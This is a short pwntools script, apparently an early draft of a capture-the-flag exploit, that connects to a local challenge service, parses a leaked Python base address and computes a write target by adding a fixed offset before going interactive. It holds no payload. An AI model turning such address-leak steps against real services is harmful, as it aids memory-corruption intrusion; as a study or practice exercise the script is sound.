from pwn import *

context.terminal = ['gnome-terminal', '-e']

io = remote("127.0.0.1", 21337)

io.recvuntil("You desired python base is ")

leak_address = int(io.recvline().strip().decode(), 16)

write_memory = leak_address + 0x56c000
print(hex(write_memory))

io.interactive()
